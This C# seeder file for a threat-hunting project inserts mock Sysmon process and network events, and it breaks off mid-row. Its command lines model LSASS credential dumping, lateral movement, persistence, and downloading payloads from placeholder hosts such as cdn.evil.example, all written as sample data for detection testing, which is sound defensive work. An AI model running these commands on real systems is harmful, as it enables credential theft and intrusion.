namespace Hunting.Data;

/// <summary>
/// Seeds mock Sysmon Event ID 1 (Process Create) data into bronze.windows_event_json.
/// Used for MVP vertical slice testing and development.
///
/// Each record simulates a realistic Windows process creation event
/// with fields matching the Sysmon schema that the parser view extracts from.
/// </summary>
public static class MockDataSeeder
{
    /// <summary>
    /// Returns INSERT statements for mock events spanning a realistic
    /// hunting scenario: normal activity, lateral movement, credential
    /// dumping, and persistence.
    /// </summary>
    public static string GetProcessSeedSql() =>
        """
        INSERT INTO bronze.windows_event_json (ingest_time, source_type, provider, event_id, computer, event_data, raw_text) VALUES
        -- Normal user activity
        (TIMESTAMP '2024-06-15 08:00:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-001',
         '{"Image":"C:\\Windows\\explorer.exe","CommandLine":"explorer.exe","User":"CORP\\alice","ProcessId":"1000","ParentImage":"C:\\Windows\\System32\\userinit.exe","ParentCommandLine":"userinit.exe","Hashes":"SHA256=abc001"}', ''),
        (TIMESTAMP '2024-06-15 08:01:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-001',
         '{"Image":"C:\\Program Files\\Microsoft Office\\WINWORD.EXE","CommandLine":"\"WINWORD.EXE\" /n \"report.docx\"","User":"CORP\\alice","ProcessId":"1200","ParentImage":"C:\\Windows\\explorer.exe","ParentCommandLine":"explorer.exe","Hashes":"SHA256=abc002"}', ''),
        (TIMESTAMP '2024-06-15 08:05:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-002',
         '{"Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd /c dir","User":"CORP\\bob","ProcessId":"2000","ParentImage":"C:\\Windows\\explorer.exe","ParentCommandLine":"explorer.exe","Hashes":"SHA256=abc003"}', ''),

        -- Reconnaissance
        (TIMESTAMP '2024-06-15 09:00:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-001',
         '{"Image":"C:\\Windows\\System32\\whoami.exe","CommandLine":"whoami /all","User":"CORP\\alice","ProcessId":"1300","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd","Hashes":"SHA256=abc004"}', ''),
        (TIMESTAMP '2024-06-15 09:00:30', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-001',
         '{"Image":"C:\\Windows\\System32\\net.exe","CommandLine":"net user /domain","User":"CORP\\alice","ProcessId":"1301","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd","Hashes":"SHA256=abc005"}', ''),
        (TIMESTAMP '2024-06-15 09:01:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-001',
         '{"Image":"C:\\Windows\\System32\\ipconfig.exe","CommandLine":"ipconfig /all","User":"CORP\\alice","ProcessId":"1302","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd","Hashes":"SHA256=abc006"}', ''),
        (TIMESTAMP '2024-06-15 09:01:30', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-001',
         '{"Image":"C:\\Windows\\System32\\nltest.exe","CommandLine":"nltest /dclist:corp.local","User":"CORP\\alice","ProcessId":"1303","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd","Hashes":"SHA256=abc007"}', ''),

        -- PowerShell activity
        (TIMESTAMP '2024-06-15 10:00:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-001',
         '{"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -ep bypass -file C:\\temp\\script.ps1","User":"CORP\\alice","ProcessId":"1400","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd","Hashes":"SHA256=abc008"}', ''),
        (TIMESTAMP '2024-06-15 10:00:05', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-002',
         '{"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -enc SQBFAFgA","User":"CORP\\bob","ProcessId":"2100","ParentImage":"C:\\Windows\\System32\\mshta.exe","ParentCommandLine":"mshta vbscript:Execute","Hashes":"SHA256=abc009"}', ''),

        -- Credential access
        (TIMESTAMP '2024-06-15 11:00:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'DC-001',
         '{"Image":"C:\\tools\\mimikatz.exe","CommandLine":"mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\"","User":"CORP\\admin","ProcessId":"3000","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd","Hashes":"SHA256=abc010"}', ''),
        (TIMESTAMP '2024-06-15 11:01:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'DC-001',
         '{"Image":"C:\\Windows\\System32\\rundll32.exe","CommandLine":"rundll32.exe comsvcs.dll MiniDump 624 C:\\temp\\lsass.dmp full","User":"CORP\\admin","ProcessId":"3001","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd","Hashes":"SHA256=abc011"}', ''),

        -- Lateral movement
        (TIMESTAMP '2024-06-15 12:00:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-003',
         '{"Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd /c copy \\\\WS-001\\c$\\temp\\payload.exe c:\\temp\\","User":"CORP\\admin","ProcessId":"4000","ParentImage":"C:\\Windows\\System32\\services.exe","ParentCommandLine":"services.exe","Hashes":"SHA256=abc012"}', ''),
        (TIMESTAMP '2024-06-15 12:00:30', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-003',
         '{"Image":"C:\\Windows\\System32\\wmic.exe","CommandLine":"wmic /node:WS-004 process call create \"c:\\temp\\payload.exe\"","User":"CORP\\admin","ProcessId":"4001","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd","Hashes":"SHA256=abc013"}', ''),

        -- Persistence
        (TIMESTAMP '2024-06-15 13:00:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-001',
         '{"Image":"C:\\Windows\\System32\\schtasks.exe","CommandLine":"schtasks /create /tn \"Updater\" /tr \"c:\\temp\\backdoor.exe\" /sc daily","User":"CORP\\alice","ProcessId":"1500","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd","Hashes":"SHA256=abc014"}', ''),
        (TIMESTAMP '2024-06-15 13:01:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-001',
         '{"Image":"C:\\Windows\\System32\\reg.exe","CommandLine":"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d c:\\temp\\backdoor.exe","User":"CORP\\alice","ProcessId":"1501","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd","Hashes":"SHA256=abc015"}', ''),

        -- Beaconing pattern (regular intervals)
        (TIMESTAMP '2024-06-15 14:00:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-001',
         '{"Image":"C:\\temp\\beacon.exe","CommandLine":"beacon.exe","User":"CORP\\alice","ProcessId":"1600","ParentImage":"C:\\Windows\\System32\\svchost.exe","ParentCommandLine":"svchost -k netsvcs","Hashes":"SHA256=abc016"}', ''),
        (TIMESTAMP '2024-06-15 14:01:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-001',
         '{"Image":"C:\\temp\\beacon.exe","CommandLine":"beacon.exe","User":"CORP\\alice","ProcessId":"1601","ParentImage":"C:\\Windows\\System32\\svchost.exe","ParentCommandLine":"svchost -k netsvcs","Hashes":"SHA256=abc016"}', ''),
        (TIMESTAMP '2024-06-15 14:02:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-001',
         '{"Image":"C:\\temp\\beacon.exe","CommandLine":"beacon.exe","User":"CORP\\alice","ProcessId":"1602","ParentImage":"C:\\Windows\\System32\\svchost.exe","ParentCommandLine":"svchost -k netsvcs","Hashes":"SHA256=abc016"}', ''),
        (TIMESTAMP '2024-06-15 14:03:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-001',
         '{"Image":"C:\\temp\\beacon.exe","CommandLine":"beacon.exe","User":"CORP\\alice","ProcessId":"1603","ParentImage":"C:\\Windows\\System32\\svchost.exe","ParentCommandLine":"svchost -k netsvcs","Hashes":"SHA256=abc016"}', ''),
        (TIMESTAMP '2024-06-15 14:04:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-001',
         '{"Image":"C:\\temp\\beacon.exe","CommandLine":"beacon.exe","User":"CORP\\alice","ProcessId":"1604","ParentImage":"C:\\Windows\\System32\\svchost.exe","ParentCommandLine":"svchost -k netsvcs","Hashes":"SHA256=abc016"}', '')
        ,
        -- Additional offensive execution and admin tooling coverage
        (TIMESTAMP '2024-06-15 15:00:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-002',
         '{"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -NoP -W Hidden -EncodedCommand SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgApAA==","User":"CORP\\bob","ProcessId":"2200","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd /c powershell launcher","Hashes":"SHA256=abc017"}', ''),
        (TIMESTAMP '2024-06-15 15:01:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-002',
         '{"Image":"C:\\Windows\\System32\\regsvr32.exe","CommandLine":"regsvr32 /s /n /u /i:https://cdn.evil.example/file.sct scrobj.dll","User":"CORP\\bob","ProcessId":"2201","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd /c regsvr32","Hashes":"SHA256=abc018"}', ''),
        (TIMESTAMP '2024-06-15 15:02:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-004',
         '{"Image":"C:\\Windows\\System32\\procdump.exe","CommandLine":"procdump.exe -accepteula -ma lsass.exe C:\\temp\\lsass_2.dmp","User":"CORP\\admin","ProcessId":"4100","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd /c procdump","Hashes":"SHA256=abc019"}', ''),
        (TIMESTAMP '2024-06-15 15:03:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-004',
         '{"Image":"C:\\Windows\\System32\\sc.exe","CommandLine":"sc create UpdaterSvc binPath= C:\\temp\\beacon.exe start= auto","User":"CORP\\admin","ProcessId":"4101","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd /c sc create","Hashes":"SHA256=abc020"}', ''),
        (TIMESTAMP '2024-06-15 15:04:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-004',
         '{"Image":"C:\\Windows\\System32\\at.exe","CommandLine":"at 23:45 /every:M,T,W,Th,F C:\\temp\\beacon.exe","User":"CORP\\admin","ProcessId":"4102","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd /c at","Hashes":"SHA256=abc021"}', ''),
        (TIMESTAMP '2024-06-15 15:05:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-003',
         '{"Image":"C:\\Windows\\System32\\rundll32.exe","CommandLine":"rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://c2.evil.example/a.sct\")","User":"CORP\\admin","ProcessId":"4200","ParentImage":"C:\\Windows\\System32\\explorer.exe","ParentCommandLine":"explorer.exe","Hashes":"SHA256=abc022"}', ''),
        (TIMESTAMP '2024-06-15 15:06:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-001',
         '{"Image":"C:\\Windows\\System32\\mshta.exe","CommandLine":"mshta.exe https://cdn.evil.example/update.hta","User":"CORP\\alice","ProcessId":"1700","ParentImage":"C:\\Windows\\System32\\explorer.exe","ParentCommandLine":"explorer.exe","Hashes":"SHA256=abc023"}', ''),
        (TIMESTAMP '2024-06-15 15:07:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-001',
         '{"Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil.exe -urlcache -split -f https://cdn.evil.example/payload.bin C:\\temp\\payload.bin","User":"CORP\\alice","ProcessId":"1701","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd /c certutil","Hashes":"SHA256=abc024"}', ''),
        (TIMESTAMP '2024-06-15 15:08:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-002',
         '{"Image":"C:\\Windows\\System32\\curl.exe","CommandLine":"curl.exe -s -o C:\\temp\\stage2.dll https://data-out.evil.example/stage2.dll","User":"CORP\\bob","ProcessId":"2202","ParentImage":"C:\\Windows\\System32\\powershell.exe","ParentCommandLine":"powershell Invoke-WebRequest","Hashes":"SHA256=abc025"}', ''),
        (TIMESTAMP '2024-06-15 15:09:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-003',
         '{"Image":"C:\\Windows\\System32\\wmic.exe","CommandLine":"wmic process call create \"powershell -w hidden -enc UwB0AGEAZwBlADIA\"","User":"CORP\\admin","ProcessId":"4201","ParentImage":"C:\\Windows\\System32\\services.exe","ParentCommandLine":"services.exe","Hashes":"SHA256=abc026"}', '')
        ,
        -- Additional volume expansion for sample-query density
        (TIMESTAMP '2024-06-15 15:10:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-005',
         '{"Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd /c net group \"Domain Admins\" /domain","User":"CORP\\charlie","ProcessId":"5100","ParentImage":"C:\\Windows\\explorer.exe","ParentCommandLine":"explorer.exe","Hashes":"SHA256=abc027"}', ''),
        (TIMESTAMP '2024-06-15 15:11:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-005',
         '{"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -nop -c Get-ADComputer -Filter *","User":"CORP\\charlie","ProcessId":"5101","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd /c recon","Hashes":"SHA256=abc028"}', ''),
        (TIMESTAMP '2024-06-15 15:12:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-006',
         '{"Image":"C:\\Windows\\System32\\reg.exe","CommandLine":"reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v ServiceHost /d C:\\temp\\svc.exe","User":"CORP\\dana","ProcessId":"6100","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd /c reg add","Hashes":"SHA256=abc029"}', ''),
        (TIMESTAMP '2024-06-15 15:13:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-006',
         '{"Image":"C:\\Windows\\System32\\schtasks.exe","CommandLine":"schtasks /create /tn \"Updater2\" /tr \"C:\\temp\\svc.exe\" /sc hourly","User":"CORP\\dana","ProcessId":"6101","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd /c schtasks","Hashes":"SHA256=abc030"}', ''),
        (TIMESTAMP '2024-06-15 15:14:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-006',
         '{"Image":"C:\\Windows\\System32\\sc.exe","CommandLine":"sc.exe start UpdaterSvc","User":"CORP\\dana","ProcessId":"6102","ParentImage":"C:\\Windows\\System32\\services.exe","ParentCommandLine":"services.exe","Hashes":"SHA256=abc031"}', ''),
        (TIMESTAMP '2024-06-15 15:15:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-002',
         '{"Image":"C:\\Windows\\System32\\rundll32.exe","CommandLine":"rundll32.exe C:\\temp\\stage2.dll,Start","User":"CORP\\bob","ProcessId":"2203","ParentImage":"C:\\Windows\\System32\\powershell.exe","ParentCommandLine":"powershell -enc ...","Hashes":"SHA256=abc032"}', ''),
        (TIMESTAMP '2024-06-15 15:16:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-002',
         '{"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -enc UwB0AGEAZwBlADM=","User":"CORP\\bob","ProcessId":"2204","ParentImage":"C:\\Windows\\System32\\rundll32.exe","ParentCommandLine":"rundll32 stage2","Hashes":"SHA256=abc033"}', ''),
        (TIMESTAMP '2024-06-15 15:17:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'DC-001',
         '{"Image":"C:\\Windows\\System32\\procdump.exe","CommandLine":"procdump.exe -ma lsass.exe C:\\temp\\lsass_3.dmp","User":"CORP\\admin","ProcessId":"3100","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd /c procdump","Hashes":"SHA256=abc034"}', ''),
        (TIMESTAMP '2024-06-15 15:18:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'DC-001',
         '{"Image":"C:\\tools\\mimikatz.exe","CommandLine":"mimikatz.exe \"sekurlsa::tickets /export\"","User":"CORP\\admin","ProcessId":"3101","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd /c mimikatz","Hashes":"SHA256=abc035"}', ''),
        (TIMESTAMP '2024-06-15 15:19:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-003',
         '{"Image":"C:\\Windows\\System32\\wmic.exe","CommandLine":"wmic /node:WS-006 process call create \"cmd /c whoami > c:\\temp\\out.txt\"","User":"CORP\\admin","ProcessId":"4202","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd /c wmic","Hashes":"SHA256=abc036"}', ''),
        (TIMESTAMP '2024-06-15 15:20:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-001',
         '{"Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -ep bypass -file C:\\temp\\inventory.ps1","User":"CORP\\alice","ProcessId":"1702","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd /c powershell","Hashes":"SHA256=abc037"}', ''),
        (TIMESTAMP '2024-06-15 15:21:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-001',
         '{"Image":"C:\\Windows\\System32\\curl.exe","CommandLine":"curl.exe -k https://198.51.100.24/a.bin -o C:\\temp\\a.bin","User":"CORP\\alice","ProcessId":"1703","ParentImage":"C:\\Windows\\System32\\powershell.exe","ParentCommandLine":"powershell downloader","Hashes":"SHA256=abc038"}', ''),
        (TIMESTAMP '2024-06-15 15:22:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-004',
         '{"Image":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd /c copy \\\\WS-006\\c$\\temp\\svc.exe c:\\temp\\","User":"CORP\\admin","ProcessId":"4103","ParentImage":"C:\\Windows\\System32\\services.exe","ParentCommandLine":"services.exe","Hashes":"SHA256=abc039"}', ''),
        (TIMESTAMP '2024-06-15 15:23:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-004',
         '{"Image":"C:\\Windows\\System32\\at.exe","CommandLine":"at 23:55 C:\\temp\\svc.exe","User":"CORP\\admin","ProcessId":"4104","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd /c at","Hashes":"SHA256=abc040"}', ''),
        (TIMESTAMP '2024-06-15 15:24:00', 'sysmon', 'Microsoft-Windows-Sysmon', 1, 'WS-005',
         '{"Image":"C:\\Windows\\System32\\mshta.exe","CommandLine":"mshta vbscript:Execute(\"CreateObject(\\\"Wscript.Shell\\\").Run \\\"powershell -enc VABFAFMAVAA=\\\",0\")","User":"CORP\\charlie","ProcessId":"5102","ParentImage":"C:\\Windows\\explorer.exe","ParentCommandLine":"explorer.exe","Hashes":"SHA256=abc041"}', '')
        """;

    /// <summary>
    /// Returns INSERT statements for mock Sysmon EID 3 (Network Connection) events.
    /// Covers normal browsing, C2 beaconing, lateral movement, DNS lookup patterns,
    /// and known-bad port connections.
    /// </summary>
    public static string GetNetworkSessionSeedSql() =>
        """
        INSERT INTO bronze.windows_event_json (ingest_time, source_type, provider, event_id, computer, event_data, raw_text) VALUES
        -- Normal browsing
        (TIMESTAMP '2024-06-15 08:30:00', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-001',
         '{"SourceIp":"10.1.1.10","SourcePort":"54321","DestinationIp":"142.250.185.46","DestinationPort":"443","Protocol":"tcp","DestinationHostname":"google.com","Image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","ProcessId":"2000","User":"CORP\\alice","Hashes":"SHA256=chrome_hash"}', ''),
        (TIMESTAMP '2024-06-15 08:31:00', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-002',
         '{"SourceIp":"10.1.1.20","SourcePort":"54400","DestinationIp":"13.107.42.14","DestinationPort":"443","Protocol":"tcp","DestinationHostname":"office.com","Image":"C:\\Program Files\\Microsoft Office\\WINWORD.EXE","ProcessId":"3000","User":"CORP\\bob","Hashes":"SHA256=office_hash"}', ''),

        -- C2 beaconing to suspicious IP (no hostname, unusual interval)
        (TIMESTAMP '2024-06-15 10:00:00', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-001',
         '{"SourceIp":"10.1.1.10","SourcePort":"49152","DestinationIp":"185.220.101.47","DestinationPort":"443","Protocol":"tcp","DestinationHostname":"","Image":"C:\\temp\\beacon.exe","ProcessId":"1600","User":"CORP\\alice","Hashes":"SHA256=abc016"}', ''),
        (TIMESTAMP '2024-06-15 10:01:00', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-001',
         '{"SourceIp":"10.1.1.10","SourcePort":"49153","DestinationIp":"185.220.101.47","DestinationPort":"443","Protocol":"tcp","DestinationHostname":"","Image":"C:\\temp\\beacon.exe","ProcessId":"1601","User":"CORP\\alice","Hashes":"SHA256=abc016"}', ''),
        (TIMESTAMP '2024-06-15 10:02:00', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-001',
         '{"SourceIp":"10.1.1.10","SourcePort":"49154","DestinationIp":"185.220.101.47","DestinationPort":"443","Protocol":"tcp","DestinationHostname":"","Image":"C:\\temp\\beacon.exe","ProcessId":"1602","User":"CORP\\alice","Hashes":"SHA256=abc016"}', ''),

        -- Suspicious port (4444 = Metasploit default)
        (TIMESTAMP '2024-06-15 11:00:00', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-003',
         '{"SourceIp":"10.1.1.30","SourcePort":"51000","DestinationIp":"192.168.99.1","DestinationPort":"4444","Protocol":"tcp","DestinationHostname":"","Image":"C:\\Windows\\System32\\cmd.exe","ProcessId":"4000","User":"CORP\\admin","Hashes":"SHA256=cmd_hash"}', ''),

        -- DNS port 53 unusual process
        (TIMESTAMP '2024-06-15 11:05:00', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-001',
         '{"SourceIp":"10.1.1.10","SourcePort":"52000","DestinationIp":"8.8.8.8","DestinationPort":"53","Protocol":"udp","DestinationHostname":"dns.google","Image":"C:\\Windows\\System32\\powershell.exe","ProcessId":"1400","User":"CORP\\alice","Hashes":"SHA256=ps_hash"}', ''),

        -- Lateral movement — SMB (port 445)
        (TIMESTAMP '2024-06-15 12:00:00', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-001',
         '{"SourceIp":"10.1.1.10","SourcePort":"50001","DestinationIp":"10.1.1.20","DestinationPort":"445","Protocol":"tcp","DestinationHostname":"WS-002","Image":"C:\\Windows\\System32\\cmd.exe","ProcessId":"5000","User":"CORP\\admin","Hashes":"SHA256=cmd_hash"}', ''),
        (TIMESTAMP '2024-06-15 12:00:10', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-001',
         '{"SourceIp":"10.1.1.10","SourcePort":"50002","DestinationIp":"10.1.1.30","DestinationPort":"445","Protocol":"tcp","DestinationHostname":"WS-003","Image":"C:\\Windows\\System32\\cmd.exe","ProcessId":"5000","User":"CORP\\admin","Hashes":"SHA256=cmd_hash"}', ''),
        (TIMESTAMP '2024-06-15 12:00:20', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-001',
         '{"SourceIp":"10.1.1.10","SourcePort":"50003","DestinationIp":"10.1.1.40","DestinationPort":"445","Protocol":"tcp","DestinationHostname":"DC-001","Image":"C:\\Windows\\System32\\cmd.exe","ProcessId":"5000","User":"CORP\\admin","Hashes":"SHA256=cmd_hash"}', ''),

        -- RDP (port 3389)
        (TIMESTAMP '2024-06-15 13:00:00', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-001',
         '{"SourceIp":"10.1.1.10","SourcePort":"60001","DestinationIp":"10.1.1.40","DestinationPort":"3389","Protocol":"tcp","DestinationHostname":"DC-001","Image":"C:\\Windows\\System32\\mstsc.exe","ProcessId":"6000","User":"CORP\\alice","Hashes":"SHA256=mstsc_hash"}', ''),

        -- High-frequency connections (exfiltration pattern)
        (TIMESTAMP '2024-06-15 14:00:00', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-002',
         '{"SourceIp":"10.1.1.20","SourcePort":"60100","DestinationIp":"203.0.113.99","DestinationPort":"80","Protocol":"tcp","DestinationHostname":"data-out.evil.example","Image":"C:\\Windows\\System32\\curl.exe","ProcessId":"7000","User":"CORP\\bob","Hashes":"SHA256=curl_hash"}', ''),
        (TIMESTAMP '2024-06-15 14:00:30', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-002',
         '{"SourceIp":"10.1.1.20","SourcePort":"60101","DestinationIp":"203.0.113.99","DestinationPort":"80","Protocol":"tcp","DestinationHostname":"data-out.evil.example","Image":"C:\\Windows\\System32\\curl.exe","ProcessId":"7001","User":"CORP\\bob","Hashes":"SHA256=curl_hash"}', ''),

        -- Normal internal traffic
        (TIMESTAMP '2024-06-15 15:00:00', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-003',
         '{"SourceIp":"10.1.1.30","SourcePort":"55000","DestinationIp":"10.1.1.5","DestinationPort":"8080","Protocol":"tcp","DestinationHostname":"intranet.corp.local","Image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","ProcessId":"8000","User":"CORP\\admin","Hashes":"SHA256=chrome_hash"}', '')
        ,
        -- Additional suspicious ports and repeated DNS activity
        (TIMESTAMP '2024-06-15 15:05:00', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-004',
         '{"SourceIp":"10.1.1.40","SourcePort":"53000","DestinationIp":"198.51.100.24","DestinationPort":"1337","Protocol":"tcp","DestinationHostname":"","Image":"C:\\Windows\\System32\\powershell.exe","ProcessId":"4100","User":"CORP\\admin","Hashes":"SHA256=abc019"}', ''),
        (TIMESTAMP '2024-06-15 15:05:30', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-004',
         '{"SourceIp":"10.1.1.40","SourcePort":"53001","DestinationIp":"198.51.100.24","DestinationPort":"31337","Protocol":"tcp","DestinationHostname":"","Image":"C:\\Windows\\System32\\powershell.exe","ProcessId":"4100","User":"CORP\\admin","Hashes":"SHA256=abc019"}', ''),
        (TIMESTAMP '2024-06-15 15:06:00', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-001',
         '{"SourceIp":"10.1.1.10","SourcePort":"52100","DestinationIp":"1.1.1.1","DestinationPort":"53","Protocol":"udp","DestinationHostname":"cloudflare-dns.com","Image":"C:\\Windows\\System32\\cmd.exe","ProcessId":"1701","User":"CORP\\alice","Hashes":"SHA256=abc024"}', ''),
        (TIMESTAMP '2024-06-15 15:06:15', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-001',
         '{"SourceIp":"10.1.1.10","SourcePort":"52101","DestinationIp":"9.9.9.9","DestinationPort":"53","Protocol":"udp","DestinationHostname":"dns.quad9.net","Image":"C:\\Windows\\System32\\powershell.exe","ProcessId":"1700","User":"CORP\\alice","Hashes":"SHA256=abc023"}', ''),
        (TIMESTAMP '2024-06-15 15:07:00', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-002',
         '{"SourceIp":"10.1.1.20","SourcePort":"60200","DestinationIp":"203.0.113.99","DestinationPort":"80","Protocol":"tcp","DestinationHostname":"data-out.evil.example","Image":"C:\\Windows\\System32\\curl.exe","ProcessId":"2202","User":"CORP\\bob","Hashes":"SHA256=abc025"}', ''),
        (TIMESTAMP '2024-06-15 15:07:30', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-002',
         '{"SourceIp":"10.1.1.20","SourcePort":"60201","DestinationIp":"203.0.113.99","DestinationPort":"80","Protocol":"tcp","DestinationHostname":"data-out.evil.example","Image":"C:\\Windows\\System32\\curl.exe","ProcessId":"2202","User":"CORP\\bob","Hashes":"SHA256=abc025"}', ''),
        (TIMESTAMP '2024-06-15 15:08:00', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-003',
         '{"SourceIp":"10.1.1.30","SourcePort":"51050","DestinationIp":"10.1.1.50","DestinationPort":"445","Protocol":"tcp","DestinationHostname":"FS-001","Image":"C:\\Windows\\System32\\wmic.exe","ProcessId":"4201","User":"CORP\\admin","Hashes":"SHA256=abc026"}', ''),
        (TIMESTAMP '2024-06-15 15:08:30', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-003',
         '{"SourceIp":"10.1.1.30","SourcePort":"51051","DestinationIp":"10.1.1.60","DestinationPort":"445","Protocol":"tcp","DestinationHostname":"APP-001","Image":"C:\\Windows\\System32\\wmic.exe","ProcessId":"4201","User":"CORP\\admin","Hashes":"SHA256=abc026"}', ''),
        (TIMESTAMP '2024-06-15 15:09:00', 'sysmon', 'Microsoft-Windows-Sysmon', 3, 'WS-002',
